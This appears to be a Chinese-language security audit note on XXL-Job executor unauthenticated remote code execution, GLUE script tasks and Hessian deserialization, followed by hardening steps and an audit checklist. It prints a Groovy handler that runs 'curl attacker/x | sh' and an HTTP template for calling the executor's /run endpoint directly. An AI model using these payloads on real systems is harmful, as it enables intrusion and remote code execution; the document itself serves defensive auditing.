# XXL-Job Executor RCE 与 GLUE 任务执行

## Executor 未授权 RCE

### 前置

XXL-Job Executor 默认监听 9999，接受 Admin 的任务下发。若 `xxl.job.executor.accesstoken`
为空或与 Admin 不一致（但都为空视为等同）→ 任何人可调用 Executor。

### 直接 RCE

Admin 端可创建 GLUE 类型任务，Executor 收到后执行任意脚本：

- `GLUE_SHELL` → sh
- `GLUE_PYTHON` → python
- `GLUE_GROOVY` → Groovy 脚本（Java 上下文 = 拿到 JVM 内存）
- `GLUE_PHP` → PHP
- `GLUE_NODEJS` → Node.js

`GLUE_GROOVY` 危险最高：
```groovy
package com.xxl.job.service.handler
import com.xxl.job.core.context.XxlJobHelper
class DemoGlueJobHandler {
    void execute() {
        Runtime.getRuntime().exec(["bash", "-c", "curl attacker/x | sh"] as String[])
    }
}
```

### 绕过 Admin 直接打 Executor

```http
POST /run HTTP/1.1
Host: executor:9999
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: <admin 的 token 或空>

{
  "jobId": 1,
  "glueType": "GLUE_SHELL",
  "glueSource": "id",
  ...
}
```

Executor 直接执行 shell。

## Admin 侧的历史 CVE

### CVE-2020-23814 — 未授权访问后台

早期版本 Admin 默认口令 admin:123456，且部分接口未鉴权（如 `/xxl-job-admin/jobcode`）。

### CVE-2022-XXXX 系列 — Hessian 反序列化

XXL-Job < 2.3.0 内部 RPC 走 Hessian。攻击者构造反序列化 payload：

```http
POST /callback HTTP/1.1
Content-Type: application/json

<Hessian2 序列化的 CommonsCollections gadget>
```

触发链参考 ysoserial CommonsCollections6 / Rome 系列。

## 修复

### 版本升级

- XXL-Job ≥ 2.3.1（Hessian 换 JSON）
- XXL-Job ≥ 2.4.0（进一步收紧默认配置）

### 强 accessToken

```yaml
xxl:
  job:
    accessToken: ${XXL_TOKEN}   # 32 字节以上随机

# executor 侧必须与 admin 一致
xxl:
  job:
    executor:
      accesstoken: ${XXL_TOKEN}
```

### 禁用危险 GLUE 类型

Admin 只允许 Java Bean 任务（`BEAN`），业务任务提前编译打包，禁用 GLUE_* 动态任务。

若必须开：
- 严格控制 admin 账号权限（RBAC）
- 记录 GLUE 编辑审计日志
- 生产环境 executor 走非 root 用户 + SELinux/AppArmor 限制

### 网络隔离

Executor 9999 只对 Admin 内网 IP 开放；Admin 只对运维网内可访问。

## 审计动作

- [ ] `xxl.job.accessToken` 非空非默认
- [ ] `xxl.job.executor.accesstoken` 与 admin 一致且非空
- [ ] XXL-Job 版本 ≥ 2.3.1
- [ ] 生产 GLUE_* 任务列表（应尽量少）
- [ ] Executor 进程用户（不应 root）
- [ ] 9999 端口暴露面
- [ ] Admin 数据库 `xxl_job_group` 表 registryList 是否有异常 IP

## 相关规则

- CWE: CWE-306 (Missing Authentication)
- CWE: CWE-78 (OS Command Injection)
- CWE: CWE-502 (Deserialization)
- 内建 pattern: `xxljob_default_config`
- CVSS: 9.8
